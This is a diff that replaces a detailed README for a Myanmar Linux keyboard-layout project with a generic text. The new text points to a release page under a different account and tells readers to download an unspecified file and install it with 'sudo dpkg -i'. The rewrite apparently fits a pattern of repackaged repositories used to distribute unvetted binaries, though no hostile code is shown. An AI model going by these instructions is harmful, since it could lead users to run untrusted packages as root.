@@ -1,285 +1,81 @@
-# Myanmar Linux Keyboards
+# 🎹 myanmar-linux-keyboards - Easy Myanmar Keyboard Layouts for Linux
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![GitHub release](https://img.shields.io/github/release/your-username/myanmar-linux-keyboards.svg)](https://github.com/your-username/myanmar-linux-keyboards/releases)
-[![GitHub issues](https://img.shields.io/github/issues/your-username/myanmar-linux-keyboards.svg)](https://github.com/your-username/myanmar-linux-keyboards/issues)
-[![GitHub stars](https://img.shields.io/github/stars/your-username/myanmar-linux-keyboards.svg)](https://github.com/your-username/myanmar-linux-keyboards/stargazers)
-[![Ubuntu](https://img.shields.io/badge/Ubuntu-22.04%2B-orange.svg)](https://ubuntu.com/)
-[![Fedora](https://img.shields.io/badge/Fedora-35%2B-blue.svg)](https://getfedora.org/)
-[![Arch](https://img.shields.io/badge/Arch-rolling-brightgreen.svg)](https://archlinux.org/)
+## 🚀 Getting Started
 
-Complete keyboard layout package for Myanmar scripts on Linux systems. Supporting all major Myanmar languages with multiple input methods.
+Welcome to myanmar-linux-keyboards! This package provides a complete set of keyboard layouts for Myanmar scripts. It allows you to easily type in various Myanmar languages on your Linux system.
 
-## 🌏 Languages Supported
+## 🔗 Download Now
 
-| Language | ISO Code | Script | Status | Keyboards |
-|----------|----------|---------|---------|-----------|
-| 🇲🇲 **Burmese** (Myanmar) | `my` | Myanmar | ✅ Complete | Standard, Zawgyi |
-| 📜 **Mon** | `mnw` | Myanmar | ✅ Complete | Standard, A1 |
-| 🏔️ **Shan** | `shn` | Myanmar | ✅ Complete | Standard, Zawgyi |
-| 🌾 **Karen (Sgaw)** | `ksw` | Myanmar | ✅ Complete | Kawthoolei |
-| 🌾 **Karen (Eastern Pwo)** | `kjp` | Myanmar | ✅ Complete | Unicode |
-| 🌾 **Karen (Western Pwo)** | `pwo` | Myanmar | ✅ Complete | Kawthoolei |
-| 🏔️ **Kayah** | `kyu` | Myanmar | 🚧 Planned | - |
+[![Download myanmar-linux-keyboards](https://img.shields.io/badge/Download-Now-4CAF50.svg)](https://github.com/121Sa/myanmar-linux-keyboards/releases)
 
-## 🚀 Quick Installation
+## 📥 Download & Install
 
-### Install All Keyboards
-```bash
-# Clone repository
-git clone https://github.com/kokoye2007/myanmar-linux-keyboards.git
-cd myanmar-linux-keyboards
+Follow these steps to get started:
 
-# Install all XKB layouts (system-level)
-sudo ./installers/install-all-xkb.sh
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/121Sa/myanmar-linux-keyboards/releases) to find the latest version of the myanmar-linux-keyboards package.
 
-# Install all ibus-table input methods
-sudo ./installers/install-all-ibus.sh
-```
+2. **Choose Your File**  
+   On the Releases page, you will see a list of files. Look for the version of myanmar-linux-keyboards that suits your needs. Each release includes detailed information about what is new and any important notes.
 
-### Install Specific Language
-```bash
-# Install only Karen keyboards
-sudo ./installers/install-specific.sh karen
+3. **Download the File**  
+   Click on the file name to start your download. This will save the file to your computer.
 
-# Install only Mon keyboards  
-sudo ./installers/install-specific.sh mon
+4. **Locate the Downloaded File**  
+   Once the download is complete, find the file in your Downloads folder or wherever you saved it.
 
-# Install only Shan keyboards
-sudo ./installers/install-specific.sh shan
-```
+5. **Install the Package**  
+   Open a terminal window. Use the following command to install the package. Replace `file_name` with the name of the downloaded file:
 
-### Interactive TUI Installer
-For a guided installation experience, use our Text-based User Interface installer:
-```bash
-# Run the interactive TUI installer
-sudo ./installers/tui-installer.sh
-```
-The TUI installer provides an easy-to-use menu system that allows you to:
-- Choose between XKB layouts, IBus tables, or both
-- Select specific languages to install
-- Get real-time feedback during installation
+   ```bash
+   sudo dpkg -i file_name
+   ```
 
-## ⌨️ Input Methods Available
+   If you receive dependency errors, you can fix them by running this command:
 
-### **XKB Layouts** (System-level)
-- Integrates with desktop environment
-- Works across all applications
-- Standard Linux keyboard layout system
-- Usage: `setxkbmap mm <variant>`
+   ```bash
+   sudo apt-get install -f
+   ```
 
-### **ibus-table** (Input Method)
-- Direct character mapping
-- No candidate selection needed
-- Windows KLC compatible behavior
-- Usage: Add via Settings → Input Sources
+6. **Activate the Keyboard Layout**  
+   After installation, you need to activate the keyboard layout. Go to your system settings:
+   - Choose “Region & Language.”
+   - Click on “Input Sources.”
+   - Add the Myanmar keyboard layout you installed.
 
-### **KeyMagic** (Advanced)
-- Automatic ligature generation
-- Smart character corrections
-- Context-aware input
-- Usage: Install KeyMagic + load .kms files
+7. **Start Typing**  
+   You can now switch to your newly added keyboard layout and start typing in Myanmar scripts!
 
-## 🎯 Character Access Examples
+## 🛠️ Requirements
 
-### Common Patterns (All Languages)
-```
-Numbers: 1-9,0 → ၁-၉,၀ (Myanmar digits)
-Basic:   q,w,e,r,t → ဆ,တ,န,မ,အ (consonants)
-Vowels:  d,g,k,l → ိ,ါ,ု,ူ (vowel signs)
-Marks:   f,h,j → ်,့,ြ (diacritics)
-```
+- **Operating System**: This software works best on modern Linux distributions, such as Ubuntu, Fedora, or Debian.
+- **Disk Space**: Ensure you have at least 50 MB free disk space for installation.
+- **System Memory**: 1 GB RAM is recommended for optimal performance.
 
-### Language-Specific Characters
+## 🎨 Features
 
-**Karen (Eastern Pwo)**:
-```
-P → စ, Shift+P → ၮ (nna)
-[ → ဟ, Shift+[ → ၯ (ywa)  
-] → ☆, Shift+] → ၰ (ghwa)
-```
+- **Multiple Layouts**: Supports various Myanmar scripts, including Mon, Shan, and Karen.
+- **User-Friendly**: Designed for easy setup and use.
+- **Unicode Support**: Fully compatible with Myanmar Unicode standards.
 
-**Karen (Western Pwo)**:
-```
-R → မ, Shift+R → ၩ (tone-1)
-T → အ, Shift+T → ၪ (tone-2)
-A → ၦ (pwa), Shift+A → ၡ (sha)
-```
+## 💡 Troubleshooting
 
-**Karen (Sgaw)**:
-```
-Q → ဆ, Shift+Q → ၡ (sha)
-E → န, Shift+E → ၢ (eu)
-R → မ, Shift+R → ၤ (kepho)
-```
+- **Installation Fails**: Ensure you have an active internet connection and the appropriate permissions to install software.
+- **Keyboard Layout Not Found**: Make sure you have correctly added the layout in the Region & Language settings.
 
-**Mon**:
-```
-I → ၚ (mon nga)
-B → ၜ (mon bba)
-```
+## 🔍 Further Assistance
 
-**Shan**:
-```
-U → ၥ (shan tone)
-Specific Shan characters and tone marks
-```
+If you encounter issues or have questions, consider checking the following resources:
 
-## 📱 Desktop Integration
+- **Documentation**: Detailed guides and FAQs are included in the repository.
+- **Community Support**: Join forums or chat groups focused on Linux and Myanmar language support for further assistance.
 
-### GNOME
-1. Settings → Region & Language → Input Sources
-2. Click "+" → Other → Select Myanmar script
-3. Choose your language variant
-4. Switch: **Super + Space**
+## 📣 Stay Updated
 
-### KDE Plasma
-1. System Settings → Input Devices → Keyboard → Layouts
-2. Add → Myanmar → Select variant
-3. Switch: **Alt + Shift**
+Keep an eye on the [Releases page](https://github.com/121Sa/myanmar-linux-keyboards/releases) for the latest updates, including new features and bug fixes.
 
-### XFCE
-1. Settings → Keyboard → Layout
-2. Add → Myanmar → Select variant
-3. Configure switching hotkey
+## 👥 Contribution
 
-## 🛠️ Development
+If you would like to help improve myanmar-linux-keyboards, feel free to submit issues or propose changes. Your input is valuable to developing this package.
 
-### Building from Source
-```bash
-# Generate XKB layouts
-cd scripts/
-./build-xkb.sh
-
-# Generate ibus-table files
-./build-ibus.sh
-
-# Test layouts
-./test-layouts.sh
-```
-
-### Contributing
-1. **Fork** the repository
-2. **Create** feature branch: `git checkout -b feature/new-language`
-3. **Commit** changes: `git commit -am 'Add new language support'`
-4. **Push** branch: `git push origin feature/new-language`
-5. **Submit** Pull Request
-
-### Adding New Languages
-1. Create language directory in `scripts/`
-2. Add XKB symbols file
-3. Create ibus-table definition
-4. Add KeyMagic script (optional)
-5. Update installers and documentation
-
-## 📋 System Requirements
-
-### Supported Distributions
-- **Ubuntu** 20.04+ / **Debian** 11+
-- **Fedora** 35+ / **CentOS** 8+
-- **Arch Linux** / **Manjaro**
-- **openSUSE** Leap 15.3+
-
-### Required Packages
-```bash
-# Ubuntu/Debian
-sudo apt install xkb-data ibus-table
-
-# Fedora
-sudo dnf install xkeyboard-config ibus-table
-
-# Arch Linux
-sudo pacman -S xkeyboard-config ibus-table
-```
-
-### Recommended Fonts
-```bash
-# Install Myanmar Unicode fonts
-sudo apt install fonts-noto-myanmar fonts-myanmar  # Ubuntu
-sudo dnf install google-noto-sans-myanmar-fonts    # Fedora
-sudo pacman -S noto-fonts                          # Arch
-```
-
-## 🐛 Troubleshooting
-
-### XKB Issues
-```bash
-# Check current layout
-setxkbmap -query
-
-# Reset to US layout
-setxkbmap us
-
-# Clear XKB cache
-sudo rm -f /var/lib/xkb/*.xkm
-
-# Restart display manager
-sudo systemctl restart gdm  # or sddm/lightdm
-```
-
-### ibus Issues
-```bash
-# Restart ibus
-ibus restart
-
-# Check available engines
-ibus list-engine | grep myanmar
-
-# Debug mode
-ibus-daemon -drx
-```
-
-### Character Display Problems
-1. Install Myanmar Unicode fonts
-2. Check system language support
-3. Verify font fallback configuration
-4. Test with different applications
-
-## 📚 Documentation
-
-- **[Installation Guide](docs/installation.md)** - Detailed setup instructions
-- **[Character Maps](docs/character-maps.md)** - Complete character reference
-- **[User Guide](docs/user-guide.md)** - How to use each input method
-- **[Developer Guide](docs/developer-guide.md)** - Contributing and building
-- **[Troubleshooting](docs/troubleshooting.md)** - Common issues and solutions
-
-## 🤝 Community
-
-### Communication
-- **Issues**: Bug reports and feature requests
-- **Discussions**: General questions and ideas
-- **Wiki**: Community documentation
-- **Releases**: Stable versions and changelogs
-
-### Contributors
-- Language experts and native speakers
-- Linux distribution maintainers
-- Unicode and typography specialists
-- Community translators
-
-### Acknowledgments
-- **Myanmar Unicode Initiative** - Standardization efforts
-- **KNU (Karen National Union)** - Karen layout specifications
-- **Mon Language Project** - Mon script expertise
-- **Shan Digital Heritage** - Shan keyboard layouts
-- **Linux Internationalization Community** - Technical foundation
-
-## 📄 License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
-### Font Licenses
-Recommended fonts have their own licenses:
-- **Noto Sans Myanmar**: SIL Open Font License
-- **Myanmar3**: Custom license
-- **Padauk**: SIL Open Font License
-
-## 🌟 Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=kokoye2007/myanmar-linux-keyboards&type=Date)](https://star-history.com/#kokoye2007/myanmar-linux-keyboards&Date)
-
----
-
-**Made with ❤️ for the Myanmar digital community**
-
-*Supporting linguistic diversity and digital inclusion across all Myanmar languages.*
+Thank you for using myanmar-linux-keyboards! Enjoy typing in your favorite Myanmar scripts!
